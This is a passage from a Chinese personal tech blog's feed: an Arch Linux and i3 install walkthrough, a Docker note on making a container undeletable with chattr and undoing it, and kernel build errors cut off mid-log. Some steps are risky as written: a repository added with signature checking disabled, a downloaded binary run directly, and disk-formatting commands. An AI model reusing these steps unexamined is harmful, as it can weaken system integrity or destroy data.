plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkfs.fat -F32 &#x2F;dev&#x2F;sda1</span><br><span class="line"></span><br><span class="line">mkfs.ext4 &#x2F;dev&#x2F;sda2</span><br><span class="line"></span><br><span class="line">mkswap &#x2F;dev&#x2F;sda3</span><br><span class="line">swapon &#x2F;dev&#x2F;sda3</span><br></pre></td></tr></table></figure><h3 id="4、挂载分区">4、挂载分区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount &#x2F;dev&#x2F;sda2 &#x2F;mnt</span><br></pre></td></tr></table></figure><h3 id="5、安装镜像">5、安装镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap &#x2F;mnt base linux linux-firmware</span><br></pre></td></tr></table></figure><h3 id="生成fstab">生成fstab</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U &#x2F;mnt &gt;&gt; &#x2F;mnt&#x2F;etc&#x2F;fstab</span><br></pre></td></tr></table></figure><h3 id="Chroot">Chroot</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot &#x2F;mnt</span><br></pre></td></tr></table></figure><h3 id="设置时区">设置时区</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><h3 id="安装vim">安装vim</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S vim</span><br></pre></td></tr></table></figure><h3 id="安装sudo">安装sudo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S sudo</span><br></pre></td></tr></table></figure><h3 id="安装yay">安装yay</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S yay</span><br></pre></td></tr></table></figure><h3 id="本地化">本地化</h3><h4 id="将-etc-locale-gen中en-US-UTF-8和zh-CN-UTF-8-UTF-8前面的-删除">将<code>/etc/locale.gen</code>中<code>en_US.UTF-8</code>和<code>zh_CN.UTF-8 UTF-8</code>前面的<code>#</code>删除</h4><h4 id="然后执行以下命令">然后执行以下命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure><h3 id="创建网络服务">创建网络服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S networkmanager</span><br><span class="line">systemctl enable NetworkManager</span><br></pre></td></tr></table></figure><h3 id="GRUB引导">GRUB引导</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pacman -S grub os-prober</span><br><span class="line">pacman -S efibootmgr</span><br><span class="line">mkdir &#x2F;boot&#x2F;efi</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;boot&#x2F;efi</span><br><span class="line">grub-install --target&#x3D;x86_64-efi --efi-directory&#x3D;&#x2F;boot&#x2F;efi --bootloader-id&#x3D;ArchLinux</span><br><span class="line">grub-mkconfig -o &#x2F;boot&#x2F;grub&#x2F;grub.cfg</span><br></pre></td></tr></table></figure><h3 id="添加用户">添加用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd -m -g wheel wjs</span><br><span class="line">passwd wjs   #设置用户密码</span><br><span class="line">passwd       #设置root密码</span><br></pre></td></tr></table></figure><h3 id="桌面">桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xf86-video-vesa xf86-video-intel</span><br><span class="line">pacman -S xorg sddm i3-gaps</span><br><span class="line">&#x2F;&#x2F; 安装窗口透明支持软件</span><br><span class="line">pacman -S compton</span><br><span class="line">pacman -S mesa-demos</span><br><span class="line">&#x2F;&#x2F; 安装状态条</span><br><span class="line">在 &#x2F;etc&#x2F;pacman.conf 文件末尾添加两行：</span><br><span class="line">[archlinuxcn]</span><br><span class="line">SigLevel&#x3D;Never</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinuxcn&#x2F;$arch</span><br><span class="line"></span><br><span class="line">pacman -Sy</span><br><span class="line"></span><br><span class="line">sudo pacman -S polybar</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 安装快捷程序启动</span><br><span class="line">pacman -S rofi</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 安装墙纸设置软件</span><br><span class="line">pacman -S feh</span><br><span class="line">systemctl enable sddm</span><br><span class="line">pacman -S terminology</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 文件浏览器</span><br><span class="line">pacman -S ranger</span><br><span class="line"></span><br><span class="line">安装终端</span><br><span class="line">pacman -S mate-terminal</span><br></pre></td></tr></table></figure><h3 id="添加字体">添加字体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman -S adobe-source-han-sans-cn-fonts</span><br><span class="line">pacman -S adobe-source-han-sans-tw-fonts</span><br><span class="line">pacman -S adobe-source-han-sans-jp-fonts</span><br></pre></td></tr></table></figure><h3 id="选装-如果是vmware虚拟机的话，请安装以下程序">[选装]如果是vmware虚拟机的话，请安装以下程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pacman -S open-vm-tools</span><br><span class="line">pacman -S xf86-input-vmmouse xf86-video-vmware</span><br><span class="line">systemctl start vmtoolsd.service</span><br><span class="line">systemctl enable vmtoolsd.service</span><br><span class="line">systemctl start vmware-vmblock-fuse.service</span><br><span class="line">systemctl enable vmware-vmblock-fuse.service</span><br></pre></td></tr></table></figure><h3 id="设置原生窗口隐藏">设置原生窗口隐藏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"># This file has been auto-generated by i3-config-wizard(1).</span><br><span class="line"># It will not be overwritten, so edit it as you like.</span><br><span class="line">#</span><br><span class="line"># Should you change your keyboard layout some time, delete</span><br><span class="line"># this file and re-run i3-config-wizard(1).</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># i3 config file (v4)</span><br><span class="line">#</span><br><span class="line"># Please see https:&#x2F;&#x2F;i3wm.org&#x2F;docs&#x2F;userguide.html for a complete reference!</span><br><span class="line"></span><br><span class="line">set $mod Mod4</span><br><span class="line"></span><br><span class="line">#设置窗口边框等等</span><br><span class="line">new_window none</span><br><span class="line">new_float normal</span><br><span class="line">hide_edge_borders both</span><br><span class="line"></span><br><span class="line">#设置窗口间距</span><br><span class="line">gaps inner 8</span><br><span class="line">gaps outer 6</span><br><span class="line"></span><br><span class="line"># 设置截图快捷键 ,先安装mate-utils, sudo pacman -S mate-utils</span><br><span class="line">bindsym $mod+p  exec  mate-screenshot -i</span><br><span class="line"></span><br><span class="line">#登录时 启用窗口透明</span><br><span class="line">exec --no-startup-id picom -b #如果不行就用picom --no-vsync</span><br><span class="line">#登陆时 随机选择壁纸 ，~&#x2F;Pictures&#x2F;DesktopBackground 下要放几张图片</span><br><span class="line">exec --no-startup-id feh --randomize --bg-fill ~&#x2F;Pictures&#x2F;DesktopBackground </span><br><span class="line"># 登陆时启动polybar</span><br><span class="line">exec --no-startup-id  ~&#x2F;.config&#x2F;polybar&#x2F;launch.sh</span><br><span class="line">#登录时启动fcitx</span><br><span class="line">exec --no-startup-id fcitx</span><br><span class="line"></span><br><span class="line"># Font for window titles. Will also be used by the bar unless a different font</span><br><span class="line"># is used in the bar &#123;&#125; block below.</span><br><span class="line">font pango:monospace 8</span><br><span class="line"></span><br><span class="line"># This font is widely installed, provides lots of unicode glyphs, right-to-left</span><br><span class="line"># text rendering and scalability on retina&#x2F;hidpi displays (thanks to pango).</span><br><span class="line">#font pango:DejaVu Sans Mono 8</span><br><span class="line"></span><br><span class="line"># The combination of xss-lock, nm-applet and pactl is a popular choice, so</span><br><span class="line"># they are included here as an example. Modify as you see fit.</span><br><span class="line"></span><br><span class="line"># xss-lock grabs a logind suspend inhibit lock and will use i3lock to lock the</span><br><span class="line"># screen before suspend. Use loginctl lock-session to lock your screen.</span><br><span class="line">exec --no-startup-id xss-lock --transfer-sleep-lock -- i3lock --nofork</span><br><span class="line"></span><br><span class="line"># NetworkManager is the most popular way to manage wireless networks on Linux,</span><br><span class="line"># and nm-applet is a desktop environment-independent system tray GUI for it.</span><br><span class="line">exec --no-startup-id nm-applet</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Use pactl to adjust volume in PulseAudio.</span><br><span class="line">set $refresh_i3status killall -SIGUSR1 i3status</span><br><span class="line">bindsym XF86AudioRaiseVolume exec --no-startup-id pactl set-sink-volume @DEFAULT_SINK@ +10% &amp;&amp; $refresh_i3status</span><br><span class="line">bindsym XF86AudioLowerVolume exec --no-startup-id pactl set-sink-volume @DEFAULT_SINK@ -10% &amp;&amp; $refresh_i3status</span><br><span class="line">bindsym XF86AudioMute exec --no-startup-id pactl set-sink-mute @DEFAULT_SINK@ toggle &amp;&amp; $refresh_i3status</span><br><span class="line">bindsym XF86AudioMicMute exec --no-startup-id pactl set-source-mute @DEFAULT_SOURCE@ toggle &amp;&amp; $refresh_i3status</span><br><span class="line"></span><br><span class="line"># Use Mouse+$mod to drag floating windows to their wanted position</span><br><span class="line">floating_modifier $mod</span><br><span class="line"></span><br><span class="line"># start a terminal</span><br><span class="line">bindsym $mod+Return exec i3-sensible-terminal</span><br><span class="line"></span><br><span class="line"># kill focused window</span><br><span class="line">bindsym $mod+Shift+q kill</span><br><span class="line"></span><br><span class="line">#设置快捷程序启动为rofi</span><br><span class="line"># start dmenu (a program launcher)</span><br><span class="line">#bindsym $mod+d exec dmenu_run</span><br><span class="line"># There also is the (new) i3-dmenu-desktop which only displays applications</span><br><span class="line"># shipping a .desktop file. It is a wrapper around dmenu, so you need that</span><br><span class="line"># installed.</span><br><span class="line"># bindsym $mod+d exec --no-startup-id i3-dmenu-desktop</span><br><span class="line">bindsym $mod+d exec --no-startup-id rofi -show drun</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># change focus</span><br><span class="line">bindsym $mod+j focus left</span><br><span class="line">bindsym $mod+k focus down</span><br><span class="line">bindsym $mod+l focus up</span><br><span class="line">bindsym $mod+semicolon focus right</span><br><span class="line"></span><br><span class="line"># alternatively, you can use the cursor keys:</span><br><span class="line">bindsym $mod+Left focus left</span><br><span class="line">bindsym $mod+Down focus down</span><br><span class="line">bindsym $mod+Up focus up</span><br><span class="line">bindsym $mod+Right focus right</span><br><span class="line"></span><br><span class="line"># move focused window</span><br><span class="line">bindsym $mod+Shift+j move left</span><br><span class="line">bindsym $mod+Shift+k move down</span><br><span class="line">bindsym $mod+Shift+l move up</span><br><span class="line">bindsym $mod+Shift+semicolon move right</span><br><span class="line"></span><br><span class="line"># alternatively, you can use the cursor keys:</span><br><span class="line">bindsym $mod+Shift+Left move left</span><br><span class="line">bindsym $mod+Shift+Down move down</span><br><span class="line">bindsym $mod+Shift+Up move up</span><br><span class="line">bindsym $mod+Shift+Right move right</span><br><span class="line"></span><br><span class="line"># split in horizontal orientation</span><br><span class="line">bindsym $mod+h split h</span><br><span class="line"></span><br><span class="line"># split in vertical orientation</span><br><span class="line">bindsym $mod+v split v</span><br><span class="line"></span><br><span class="line"># enter fullscreen mode for the focused container</span><br><span class="line">bindsym $mod+f fullscreen toggle</span><br><span class="line"></span><br><span class="line"># change container layout (stacked, tabbed, toggle split)</span><br><span class="line">bindsym $mod+s layout stacking</span><br><span class="line">bindsym $mod+w layout tabbed</span><br><span class="line">bindsym $mod+e layout toggle split</span><br><span class="line"></span><br><span class="line"># toggle tiling &#x2F; floating</span><br><span class="line">bindsym $mod+Shift+space floating toggle</span><br><span class="line"></span><br><span class="line"># change focus between tiling &#x2F; floating windows</span><br><span class="line">bindsym $mod+space focus mode_toggle</span><br><span class="line"></span><br><span class="line"># focus the parent container</span><br><span class="line">bindsym $mod+a focus parent</span><br><span class="line"></span><br><span class="line"># focus the child container</span><br><span class="line">#bindsym $mod+d focus child</span><br><span class="line"></span><br><span class="line"># Define names for default workspaces for which we configure key bindings later on.</span><br><span class="line"># We use variables to avoid repeating the names in multiple places.</span><br><span class="line">set $ws1 &quot;1&quot;</span><br><span class="line">set $ws2 &quot;2&quot;</span><br><span class="line">set $ws3 &quot;3&quot;</span><br><span class="line">set $ws4 &quot;4&quot;</span><br><span class="line">set $ws5 &quot;5&quot;</span><br><span class="line">set $ws6 &quot;6&quot;</span><br><span class="line">set $ws7 &quot;7&quot;</span><br><span class="line">set $ws8 &quot;8&quot;</span><br><span class="line">set $ws9 &quot;9&quot;</span><br><span class="line">set $ws10 &quot;10&quot;</span><br><span class="line"></span><br><span class="line"># switch to workspace</span><br><span class="line">bindsym $mod+1 workspace number $ws1</span><br><span class="line">bindsym $mod+2 workspace number $ws2</span><br><span class="line">bindsym $mod+3 workspace number $ws3</span><br><span class="line">bindsym $mod+4 workspace number $ws4</span><br><span class="line">bindsym $mod+5 workspace number $ws5</span><br><span class="line">bindsym $mod+6 workspace number $ws6</span><br><span class="line">bindsym $mod+7 workspace number $ws7</span><br><span class="line">bindsym $mod+8 workspace number $ws8</span><br><span class="line">bindsym $mod+9 workspace number $ws9</span><br><span class="line">bindsym $mod+0 workspace number $ws10</span><br><span class="line"></span><br><span class="line"># move focused container to workspace</span><br><span class="line">bindsym $mod+Shift+1 move container to workspace number $ws1</span><br><span class="line">bindsym $mod+Shift+2 move container to workspace number $ws2</span><br><span class="line">bindsym $mod+Shift+3 move container to workspace number $ws3</span><br><span class="line">bindsym $mod+Shift+4 move container to workspace number $ws4</span><br><span class="line">bindsym $mod+Shift+5 move container to workspace number $ws5</span><br><span class="line">bindsym $mod+Shift+6 move container to workspace number $ws6</span><br><span class="line">bindsym $mod+Shift+7 move container to workspace number $ws7</span><br><span class="line">bindsym $mod+Shift+8 move container to workspace number $ws8</span><br><span class="line">bindsym $mod+Shift+9 move container to workspace number $ws9</span><br><span class="line">bindsym $mod+Shift+0 move container to workspace number $ws10</span><br><span class="line"></span><br><span class="line"># reload the configuration file</span><br><span class="line">bindsym $mod+Shift+c reload</span><br><span class="line"># restart i3 inplace (preserves your layout&#x2F;session, can be used to upgrade i3)</span><br><span class="line">bindsym $mod+Shift+r restart</span><br><span class="line"># exit i3 (logs you out of your X session)</span><br><span class="line">bindsym $mod+Shift+e exec &quot;i3-nagbar -t warning -m &#39;You pressed the exit shortcut. Do you really want to exit i3? This will end your X session.&#39; -B &#39;Yes, exit i3&#39; &#39;i3-msg exit&#39;&quot;</span><br><span class="line"></span><br><span class="line"># resize window (you can also use the mouse for that)</span><br><span class="line">mode &quot;resize&quot; &#123;</span><br><span class="line">        # These bindings trigger as soon as you enter the resize mode</span><br><span class="line"></span><br><span class="line">        # Pressing left will shrink the window’s width.</span><br><span class="line">        # Pressing right will grow the window’s width.</span><br><span class="line">        # Pressing up will shrink the window’s height.</span><br><span class="line">        # Pressing down will grow the window’s height.</span><br><span class="line">        bindsym j resize shrink width 10 px or 10 ppt</span><br><span class="line">        bindsym k resize grow height 10 px or 10 ppt</span><br><span class="line">        bindsym l resize shrink height 10 px or 10 ppt</span><br><span class="line">        bindsym semicolon resize grow width 10 px or 10 ppt</span><br><span class="line"></span><br><span class="line">        # same bindings, but for the arrow keys</span><br><span class="line">        bindsym Left resize shrink width 10 px or 10 ppt</span><br><span class="line">        bindsym Down resize grow height 10 px or 10 ppt</span><br><span class="line">        bindsym Up resize shrink height 10 px or 10 ppt</span><br><span class="line">        bindsym Right resize grow width 10 px or 10 ppt</span><br><span class="line"></span><br><span class="line">        # back to normal: Enter or Escape or $mod+Shift+r</span><br><span class="line">        bindsym Return mode &quot;default&quot;</span><br><span class="line">        bindsym Escape mode &quot;default&quot;</span><br><span class="line">        bindsym $mod+r mode &quot;default&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bindsym $mod+r mode &quot;resize&quot;</span><br><span class="line"></span><br><span class="line"># 关掉i3bar</span><br><span class="line"># Start i3bar to display a workspace bar (plus the system information i3status</span><br><span class="line"># finds out, if available)</span><br><span class="line">#bar &#123;</span><br><span class="line">#        status_command i3status</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># exec --no-startup-id conky -c ~&#x2F;.conkyrc</span><br></pre></td></tr></table></figure><h3 id="vmware窗口分辨率自动适配">vmware窗口分辨率自动适配</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">自动适配的意思是，当你在宿主机里缩放 VMware 窗口之后，Arch 作为客户机系统，应该自动根据主系统窗口的新尺寸来调整分辨率。</span><br><span class="line"></span><br><span class="line">方案 1</span><br><span class="line">确保在设置里开启了自动适配。</span><br><span class="line"></span><br><span class="line">VMware Worksation 的这一设置位于：View -&gt; Autosize -&gt; Autofit Guest</span><br><span class="line"></span><br><span class="line">方案 2</span><br><span class="line">分辨率自动适配的功能依赖 gtkmm 和 gtk2 软件包。确保客户机里装上这两个包。如果你没安装 X，或者你使用的桌面环境不依赖 GTK（比如 KDE），那么你需要手动安装这两个包。</span><br><span class="line"></span><br><span class="line">方案 3</span><br><span class="line">通过 mkinitcpio.conf 加载以下模块：</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;mkinitcpio.conf</span><br><span class="line">MODULES&#x3D;&quot;vsock vmw_vsock_vmci_transport vmw_balloon vmw_vmci vmwgfx&quot;</span><br><span class="line">然后运行：</span><br><span class="line"></span><br><span class="line"># mkinitcpio -p linux</span><br><span class="line">再重启试试看。</span><br><span class="line"></span><br><span class="line">方案 4</span><br><span class="line">启用 vmtoolsd.service.</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;arch linux安装全过程&lt;/p&gt;
&lt;h3 id=&quot;1、设置时区&quot;&gt;1、设置时区&lt;/h3&gt;
&lt;hr&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Docker-隐藏参数</title>
    <link href="http://yoursite.com/2020/08/05/Docker-%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0/"/>
    <id>http://yoursite.com/2020/08/05/Docker-%E9%9A%90%E8%97%8F%E5%8F%82%E6%95%B0/</id>
    <published>2020-08-05T07:10:30.418Z</published>
    <updated>2020-08-05T07:17:11.498Z</updated>
    
    <content type="html"><![CDATA[<p>Docker<br>–cap-add LINUX_IMMUTABLE<br>docker run -tid --cap-add LINUX_IMMUTABLE image_name<br>然后进入之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch 1</span><br><span class="line">chattr +i 1</span><br></pre></td></tr></table></figure><p>然后kill rm发现删不了docker<br>需要通过一下方法修复</p><p>先执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id &#x2F;&#x2F;查看它的报错目录</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">screen ~&#x2F;Library&#x2F;Containers&#x2F;com.docker.docker&#x2F;Data&#x2F;vms&#x2F;0&#x2F;tty</span><br><span class="line">cd 报错目录</span><br><span class="line">wget https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;binaries&#x2F;1.30.0-i686&#x2F;busybox_CHATTR</span><br><span class="line">.&#x2F;busybox_CHATTR -i 1</span><br><span class="line">screen -list &#x2F;&#x2F;列出所有的screen</span><br><span class="line">screen -S screen_name -X quit</span><br></pre></td></tr></table></figure><p>再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm container_id &#x2F;&#x2F;查看它的报错目录</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Docker&lt;br&gt;
–cap-add LINUX_IMMUTABLE&lt;br&gt;
docker run -tid --cap-add LINUX_IMMUTABLE image_name&lt;br&gt;
然后进入之后&lt;/p&gt;
&lt;figure class=&quot;highlight plai
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux-qemu模拟arm64</title>
    <link href="http://yoursite.com/2020/08/04/Linux-qemu%E6%A8%A1%E6%8B%9Farm64/"/>
    <id>http://yoursite.com/2020/08/04/Linux-qemu%E6%A8%A1%E6%8B%9Farm64/</id>
    <published>2020-08-04T06:07:02.000Z</published>
    <updated>2020-08-04T03:30:43.533Z</updated>
    
    <content type="html"><![CDATA[<h3 id="编译arm64-aarch64-Kernel可能会遇到的问题">编译arm64(aarch64) Kernel可能会遇到的问题</h3><h4 id="问题1">问题1:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  HOSTCC  scripts&#x2F;extract-cert</span><br><span class="line">scripts&#x2F;extract-cert.c:21:10: fatal error: openssl&#x2F;bio.h: No such file or directory</span><br><span class="line"> #include &lt;openssl&#x2F;bio.h&gt;</span><br><span class="line">          ^~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">make[1]: *** [scripts&#x2F;Makefile.host:103: scripts&#x2F;extract-cert] Error 1</span><br><span class="line">make: *** [Makefile:1133: scripts] Error 2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><h4 id="问题2">问题2:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  HOSTCC  scripts&#x2F;extract-cert</span><br><span class="line">  HOSTCC  scripts&#x2F;mod&#x2F;mk_elfconfig</span><br><span class="line">  CC      scripts&#x2F;mod&#x2F;devicetable-offsets.s</span><br><span class="line">  CC      scripts&#x2F;mod&#x2F;empty.o</span><br><span class="line">  MKELF   scripts&#x2F;mod&#x2F;elfconfig.h</span><br><span class="line">  HOSTCC  